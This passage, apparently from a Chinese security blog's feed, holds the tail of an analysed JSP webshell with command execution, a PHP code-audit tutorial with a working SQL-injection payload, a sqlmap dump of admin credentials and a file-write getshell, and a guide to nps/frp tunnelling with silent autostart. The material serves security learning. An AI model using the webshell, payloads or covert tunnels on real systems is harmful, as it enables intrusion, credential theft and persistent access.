class="string">&quot;A&quot;</span>)) &#123;                    <span class="comment">// QWEasd123=A就调用AA函数</span></span><br><span class="line">            String s = <span class="keyword">new</span> File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!s.substring(<span class="number">0</span>, <span class="number">1</span>).equals(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;B&quot;</span>)) &#123;             <span class="comment">// QWEasd123=B就调用BB函数</span></span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;C&quot;</span>)) &#123;             <span class="comment">// QWEasd123=C就调用CC函数</span></span><br><span class="line">            String l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(</span><br><span class="line">                            z1))));</span><br><span class="line">            <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;D&quot;</span>)) &#123;             <span class="comment">// QWEasd123=D就调用DD函数</span></span><br><span class="line">            BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(</span><br><span class="line">                    <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(</span><br><span class="line">                            <span class="keyword">new</span> File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;E&quot;</span>)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;F&quot;</span>)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;G&quot;</span>)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;H&quot;</span>)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;I&quot;</span>)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;J&quot;</span>)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;K&quot;</span>)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;L&quot;</span>)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;M&quot;</span>)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(<span class="number">2</span>), z1.substring(<span class="number">0</span>, <span class="number">2</span>), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;N&quot;</span>)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;O&quot;</span>)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;P&quot;</span>)) &#123;</span><br><span class="line">            PP(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;Q&quot;</span>)) &#123;</span><br><span class="line">            QQ(cs, z1, z2, sb);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">// 其他情况出现错误时，显示错误原因</span></span><br><span class="line">        sb.append(<span class="string">&quot;ERROR&quot;</span> + <span class="string">&quot;:// &quot;</span> + e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>);<span class="comment">// 结尾的｜&lt;-</span></span><br><span class="line">    out.print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>攻击者可以通过菜刀蚁剑等shell连接工具，对该webshell进行利用，</p><p><img src="http://image.v0w.top/Blog/2020-09-02-024309.png"></p><p>也可以直接利用函数中的参数进行利用：</p><p>比如通过<code>QWEasd123=A</code>调用webshell列目录的功能：</p><p><img src="http://image.v0w.top/Blog/2020-09-02-024714.jpg"></p><p>再如：<code>QWEasd123=B&amp;z1=/</code>列出指定目录的文件和读写权限。</p><p><img src="http://image.v0w.top/Blog/2020-09-02-025317.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计常见的三种方法（PHP篇）</title>
      <link href="/2020/08/26/CodeAudit-php/"/>
      <url>/2020/08/26/CodeAudit-php/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前也做过一些代码审计，主要语言是PHP，大部分情况下，都是东一榔头西一棒，非常不优雅，甚至有时为了找一个功能点的代码，翻来倒去很久，浪费时间。偶然看见<a href="https://www.sqlsec.com/2020/07/macphp.html">国光0rz的php代码审计环境的搭建</a>，在搭建完之后，我又尝试对<a href="https://www.sqlsec.com/2020/01/sinsiu.html">国光大佬0rz分析过了的一个企业建站系统</a>进行简单复现，得益于代码审计环境尤其是PHP调试环境的搭建，我很快就可以定位到功能点的具体代码，大大缩短寻找功能点代码的时间，提高审计效率。于是记录一下现在的一个审计过程。文章偏小白，大佬轻喷0rz。</p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>环境准备方面，前人之述备矣。参考：</p><p><a href="https://www.sqlsec.com/2020/07/macphp.html">macOS 下优雅地配置 PHP 代码审计环境</a></p><p>环境解决之后，接下来本菜鸡将以新秀企业建站系统为例简述现在的代码审计流程。</p><p>参考链接：<a href="https://www.sqlsec.com/2020/01/sinsiu.html">PHP代码审计初次尝试之新秀企业网站系统</a></p><h1 id="0x02-从代码本身找漏洞"><a href="#0x02-从代码本身找漏洞" class="headerlink" title="0x02 从代码本身找漏洞"></a>0x02 从代码本身找漏洞</h1><p>不知道大家在进行白盒测试的时候，一般使用什么样的方式。我之前一般就比较无脑，直接seay师傅的代码审计工具一上，然后对其检测出来的问题点，挨个查看，再找相应的功能点进行验证。这种方式可能确实能发现很多问题，但是由于seay代码审计工具，是通过找危险函数来判断是否为漏洞点，所以存在<strong>误报率很高的问题</strong>。另一方面，通过代码，想去<strong>反过来找到对应的功能点位置</strong>，实际上是比较<strong>难</strong>的。</p><p>同样的自动化代码审计工具有：</p><ul><li>Seay源代码审计系统</li><li>Fortify SCA</li><li>RIPS</li></ul><p>以Seay源代码审计系统为例：</p><p><img src="http://image.v0w.top/Blog/2020-09-02-082635.png"></p><p>由于Seay审计工具以及类似产品的原理是通过规则匹配，查找可能存在问题和漏洞的点，比较好的是可以很快的给我列出很多可能存在漏洞的点。</p><p>但是有两个问题比较难以解决：</p><ol><li>如何通过这些代码的位置定位到功能点的位置。</li><li>规则匹配导致输出的漏洞点数量远远大于实际的风险漏洞的数量，需要消耗大量的精力复现和筛选，大部分时间都浪费在人工消除误报。</li></ol><p>基于以上两个原因，我开始尝试<strong>从功能点+调试的方式来找漏洞</strong>。</p><h1 id="0x03-从功能点调试的方式找漏洞"><a href="#0x03-从功能点调试的方式找漏洞" class="headerlink" title="0x03 从功能点调试的方式找漏洞"></a>0x03 从功能点调试的方式找漏洞</h1><p>所谓从功能点来找漏洞，顾名思义，就是通过搭建一个完整的环境（比如CMS等建站系统的环境），然后<strong>对常见的功能点进行测试，通过调试的方式来找到对应功能点的源码</strong>。在对源码进行审计，这样我们可以<strong>较为轻松的定位功能点和具体代码的对应关系，对整个代码的逻辑有更为清楚的认识</strong>。</p><p>以新秀企业建站系统为例，讲一讲如何通过调试方式对特定功能点进行检查，确认其是否存在漏洞。</p><h2 id="3-1-admin页面是否存在SQL注入"><a href="#3-1-admin页面是否存在SQL注入" class="headerlink" title="3.1 admin页面是否存在SQL注入"></a>3.1 admin页面是否存在SQL注入</h2><p>admin页面，通过<code>MySQLMonitor</code>监听SQL语句的执行情况，找到账号登录时的SQL语句。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-035352.png"></p><p>通过对这个SQL语句的一部分进行全project搜索，找到相应的代码点。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-040600.jpg"></p><p><strong>注意：此时的代码可能不是最终的SQL语句执行的代码点</strong>，但是没有关系，我们可以在这里下断点，然后在浏览器里执行相应的操作，比如我们这里是输入账号密码，登录。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-035518.jpg"></p><p>之后，因为下了断点，开启xdebug监听，我们可以step in，然后之后找到相应的SQL语句的位置，再对其源码进行审计。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-030634.jpg"></p><p>此处，明显还是使用了SQL语句的拼接，这个可能是存在问题的，但是是否存在SQL注入漏洞，我们还需要进一步验证。</p><p>比如我们这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username &#x3D; admin&#39; and sleep(2)#</span><br><span class="line">password &#x3D; 123</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-042319.png"></p><p>结果发现好像<code>&#39;</code>被转义了。</p><p>我们可以将断点往前面放一点：</p><p>发现这个小小的企业建站系统，竟然还做了不错的安全限制。</p><p>1.<code>include/function.php:426</code> safe函数对攻击IP封禁一段时间。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-055339.png"></p><p>2.<code>include/function.php:74</code> strict函数将一些危险字符替换成对应的HTML实体，确实可以防护很多的SQL注入攻击。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-055047.png"></p><p>然后我们就可以确认，admin的登录点不存在SQL注入。</p><p>其他的功能点也是一样，可以通过调试方式，非常轻松地定位到代码，然后审计一下代码的逻辑和危险函数的使用是否存在问题，基本上，所有功能点过一遍就差不多了。当然，全部过一遍之后，还可以再结合seay审计工具来查漏补缺一下。</p><p>我们再举一两个例子。</p><h2 id="3-2-前台搜索功能点SQL注入漏洞"><a href="#3-2-前台搜索功能点SQL注入漏洞" class="headerlink" title="3.2 前台搜索功能点SQL注入漏洞"></a>3.2 前台搜索功能点SQL注入漏洞</h2><p>先输入一个关键词，利用MySQLMonitor定位SQL语句。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-TEST&#x2F;</span><br></pre></td></tr></table></figure><p>找到测试的关键词，找到相应的SQL语句。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-073347.png"></p><p>对SQL语句的一部分进行全project的搜索，定位一下：</p><p><img src="http://image.v0w.top/Blog/2020-08-27-073906.jpg"></p><p>下断点，执行看看：</p><p>发现<code>index/module/search_main.php:2:module_search_main()函数</code>这里是SQL语句直接拼接了，而且不像之前经过过滤。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-074311.png"></p><p>于是我们就有了这样的结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-%27UNION%20ALL%20SELECT%20NULL,NULL,database()--%20-</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-085057.png"></p><p>确定这里存在SQL注入之后，就可以通过sqlmap来进行利用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-%27*%20%23&#x2F;&quot; -v 3 -D susiu -T php_admin -C adm_id,adm_username,adm_password --dump</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-085356.png"></p><p>我们很轻松的找到（fu xian）了一个漏洞。</p><h2 id="3-3-后台语言设置Getshell"><a href="#3-3-后台语言设置Getshell" class="headerlink" title="3.3 后台语言设置Getshell"></a>3.3 后台语言设置Getshell</h2><p>看了上面的两个例子，那么问题来了，如果说一个功能点他不直接和数据库交互，我们如何通过功能点来定位代码呢？</p><p>我的方法是，搜索一些特定字符串，听上去很傻，但是往往挺有效果的。</p><p>比如我们怀疑后台编辑语言文件的位置存在任意文件写入的问题导致getshell。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-012116.jpg"></p><p>那我们可以去搜索<strong>编辑语言包成功</strong>。在搜索一些关键词时，如果直接搜可能找不到，可以使用模糊查询或者正则表达式查询。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-012211.jpg"></p><p>前后结合一下，能够找到写文件的位置。之后，设置断点，进行测试，而且比较清晰的看到代码的执行过程。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-014140.jpg"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">$lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">file_put_contents($path,$lang_text);</span><br></pre></td></tr></table></figure><p><code>$path</code>过了<code>strict</code>过滤器，<code>$lang_text</code>文件内容过了<code>no_filter</code>过滤器。</p><p><code>no_filter</code>过滤器就转义了一下，几乎相当于没有过滤，我们就可以任意文件写入。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">&#123;</span><br><span class="line">$str = stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$path</code>也是可控的，所以就可以很轻松的写入shell。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-014316.jpg"></p><p>当然，该方法虽然一般情况下的表现不错。但是，相比于通过seay审计工具挨个去看危险函数，<strong>该方法对源码的整体性以及漏洞的挖掘程度并不够</strong>。</p><h1 id="0x04-整体阅读代码"><a href="#0x04-整体阅读代码" class="headerlink" title="0x04 整体阅读代码"></a>0x04 整体阅读代码</h1><p>这种方法比较硬核。。。</p><p>本人尚菜，很少尝试这样去审计一个系统。</p><p>当然，对于一个比较小的系统，或者类似于CTF中的代码审计，可能只是有一个场景，<strong>整体代码量较小的情况</strong>下，会是非常不错的方式。不仅可以较为深入的挖掘漏洞，还可以较为深入的挖掘漏洞的成因，利用方式。比如比较流行的<strong>php反序列化的POP利用链</strong>。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>本文总结了php代码审计的常见三种方法。并以新秀企业建站系统为例，详细实战了功能点调试的方式找漏洞的方法：</p><ol><li>代码本身找漏洞</li><li>通过功能点调试的方式找漏洞</li><li>整体阅读代码找漏洞</li></ol><p>希望对读者在代码审计的入门有帮助。祝福各位师傅早日挖到属于自己的洞。</p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><a href="https://www.sqlsec.com/2020/07/macphp.html">国光——macOS 下优雅地配置 PHP 代码审计环境</a></li><li><a href="https://www.sqlsec.com/2020/01/sinsiu.html">国光——PHP代码审计初次尝试之新秀企业网站系统</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见内网穿透工具使用总结</title>
      <link href="/2020/08/11/IntranetProxy/"/>
      <url>/2020/08/11/IntranetProxy/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文以渗透的视角，总结几种个人常用的内网穿透，内网代理工具，介绍其简单原理和使用方法。</p><h1 id="0x01-nps-npc"><a href="#0x01-nps-npc" class="headerlink" title="0x01 nps-npc"></a>0x01 nps-npc</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><blockquote><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。目前支持<strong>tcp、udp流量转发</strong>，可支持任何<strong>tcp、udp</strong>上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还<strong>支持内网http代理、内网socks5代理</strong>、<strong>p2p等</strong>，并带有功能强大的web管理端。</p></blockquote><ul><li>一台有公网IP的服务器（VPS）运行服务端（<strong>NPS</strong>）</li><li>一个或多个运行在内网的服务器或者PC运行客户端（<strong>NPC</strong>）</li></ul><p><img src="http://image.v0w.top/Blog/2020-09-07-044750.jpg"></p><h2 id="1-2-特点"><a href="#1-2-特点" class="headerlink" title="1.2 特点"></a>1.2 特点</h2><ol><li>Go语言编写</li><li>支持跨平台</li><li>支持多种协议的代理</li><li>web管理端</li></ol><h2 id="1-3-使用方法"><a href="#1-3-使用方法" class="headerlink" title="1.3 使用方法"></a>1.3 使用方法</h2><p><a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p><h3 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h3><h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><p>找到自己服务器相应版本的server：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;cnlh&#x2F;nps&#x2F;releases&#x2F;download&#x2F;v0.23.2&#x2F;linux_amd64_server.tar.gz</span><br><span class="line">tar xzvf linux_amd64_server.tar.gz</span><br><span class="line">cd ~&#x2F;nps</span><br></pre></td></tr></table></figure><p>在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改<code>conf/nps.conf</code>即可：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim conf&#x2F;nps.conf</span><br></pre></td></tr></table></figure><p>需要改一下<code>#web</code>下面的几个参数，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web_host&#x3D; 服务器IP或者域名</span><br><span class="line">web_username&#x3D; admin（登录用户名）</span><br><span class="line">web_password&#x3D; 你的密码</span><br><span class="line">web_port&#x3D;8080（web管理端口）</span><br></pre></td></tr></table></figure><p>修改<code>#bridge</code> 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##bridge</span><br><span class="line">bridge_type&#x3D;tcp</span><br><span class="line">bridge_port&#x3D;443# 修改连接端口</span><br><span class="line">bridge_ip&#x3D;0.0.0.0</span><br></pre></td></tr></table></figure><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Mac&#x2F;Linux</span><br><span class="line">.&#x2F;nps test|start|stop|restart|status  测试配置文件|启动|停止|重启|状态</span><br><span class="line"></span><br><span class="line">#Windows</span><br><span class="line">nps.exe test|start|stop|restart|status 测试配置文件|启动|停止|重启|状态</span><br></pre></td></tr></table></figure><h3 id="NPC"><a href="#NPC" class="headerlink" title="NPC"></a>NPC</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;npc -server&#x3D;你的IP:8024 -vkey&#x3D;唯一验证密码 -type&#x3D;tcp</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-09-07-024103.png"></p><p>​    </p><p>新建好客户端后，也可以在<code>+</code>中看到，详细的客户端连接命令：</p><p><img src="http://image.v0w.top/Blog/2020-09-07-043729.jpg"></p><h3 id="web管理端"><a href="#web管理端" class="headerlink" title="web管理端"></a>web管理端</h3><p>在客户端界面可以通过<code>新增</code>的方式添加客户端连接，每一个连接的vkey都是唯一区分的。</p><p>每一个客户端，在建立连接后，都可以建立多个不同协议的隧道，这一个个隧道就是不同的代理了。</p><p><img src="http://image.v0w.top/Blog/2020-09-07-044514.jpg"></p><p>通过不同的协议和端口就可以连接代理的内网机器。</p><h1 id="0x02-frp"><a href="#0x02-frp" class="headerlink" title="0x02 frp"></a>0x02 frp</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><blockquote><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p></blockquote><p><img src="http://image.v0w.top/Blog/2020-09-07-051644.jpg"></p><h2 id="2-2-特点"><a href="#2-2-特点" class="headerlink" title="2.2 特点"></a>2.2 特点</h2><ul><li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li><li>端口复用，多个服务通过同一个服务端端口暴露。</li><li>跨平台，但是支持的比nps少一点</li><li>多种插件，提供很多功能</li></ul><h2 id="2-3-使用方法"><a href="#2-3-使用方法" class="headerlink" title="2.3 使用方法"></a>2.3 使用方法</h2><p>下载：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><blockquote><p>以下内容摘自：<a href="https://segmentfault.com/a/1190000021876836">https://segmentfault.com/a/1190000021876836</a></p></blockquote><h3 id="1-通过-rdp-访问家里的机器"><a href="#1-通过-rdp-访问家里的机器" class="headerlink" title="1. 通过 rdp 访问家里的机器"></a>1. 通过 rdp 访问家里的机器</h3><ol><li><p>修改 frps.ini 文件，为了安全起见，这里最好配置一下身份验证，服务端和客户端的 common 配置中的 <code>token</code> 参数一致则身份验证通过：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br></pre></td></tr></table></figure></li><li><p>启动 frps：</p><p><code>./frps -c ./frps.ini</code></p></li><li><p>修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure></li><li><p>启动 frpc：</p><p><code>./frpc -c ./frpc.ini</code></p></li><li><p>通过 rdp 访问远程的机器，地址为：</p><p><code>x.x.x.x:6000</code></p></li></ol><h4 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h4><p>针对 Windows 系统，为了便于使用，可以配置一下开机的时候静默启动。</p><ol><li><p>在 frpc.exe 的同级目录创建一个 start_frpc.vbs：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;start_frpc.vbs</span><br><span class="line">&#39;请根据实际情况修改路径</span><br><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;&quot;&quot;D:\Program Files\frp_windows_amd64\frpc.exe&quot;&quot;&quot; &amp; &quot;-c&quot; &amp; &quot;&quot;&quot;D:\Program Files\frp_windows_amd64\frpc.ini&quot;&quot;&quot;,0</span><br></pre></td></tr></table></figure></li><li><p>复制 start_frpc.vbs 文件，打开以下目录，注意将</p></li></ol>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;USER_NAME&gt;</span><br></pre></td></tr></table></figure><p>   改为你的用户名：</p><p>   <code>C:\Users\&lt;USER_NAME&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p><ol start="3"><li>鼠标右击，粘贴为快捷方式即可。</li></ol><h3 id="2-通过-SSH-访问公司内网机器"><a href="#2-通过-SSH-访问公司内网机器" class="headerlink" title="2. 通过 SSH 访问公司内网机器"></a>2. 通过 SSH 访问公司内网机器</h3><p>frps 的部署步骤同上。</p><ol><li><p>启动 frpc，配置如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure></li><li><p>通过 SSH 访问内网机器，假设用户名为 test：</p><p><code>ssh -oPort=6000 test@x.x.x.x</code></p></li></ol><h3 id="3-通过自定义域名访问部署于内网的-Web-服务"><a href="#3-通过自定义域名访问部署于内网的-Web-服务" class="headerlink" title="3. 通过自定义域名访问部署于内网的 Web 服务"></a>3. 通过自定义域名访问部署于内网的 Web 服务</h3><p>有时想要让其他人通过域名访问或者测试我们在本地搭建的 Web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。</p><ol><li><p>修改 frps.ini 文件，设置 http 访问端口为 8080：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">vhost_http_port &#x3D; 8080</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br></pre></td></tr></table></figure></li><li><p>启动 frps：</p><p><code>./frps -c ./frps.ini</code></p></li><li><p>修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 Web 服务对应的端口， 绑定自定义域名 <code>www.yourdomain.com</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type &#x3D; http</span><br><span class="line">local_port &#x3D; 80</span><br><span class="line">custom_domains &#x3D; www.yourdomain.com</span><br></pre></td></tr></table></figure></li><li><p>启动 frpc：</p><p><code>./frpc -c ./frpc.ini</code></p></li><li><p>将 <code>www.yourdomain.com</code> 的域名 A 记录解析到 IP <code>x.x.x.x</code>，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。</p></li><li><p>通过浏览器访问 <code>http://www.yourdomain.com:8080</code> 即可访问到处于内网机器上的 Web 服务。</p></li></ol><h3 id="4-对外提供简单的文件访问服务"><a href="#4-对外提供简单的文件访问服务" class="headerlink" title="4. 对外提供简单的文件访问服务"></a>4. 对外提供简单的文件访问服务</h3><p>通过 <code>static_file</code> 插件可以对外提供一个简单的基于 HTTP 的文件访问服务。</p><p>frps 的部署步骤同上。</p><ol><li><p>启动 frpc，启用 <code>static_file</code> 插件，配置如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 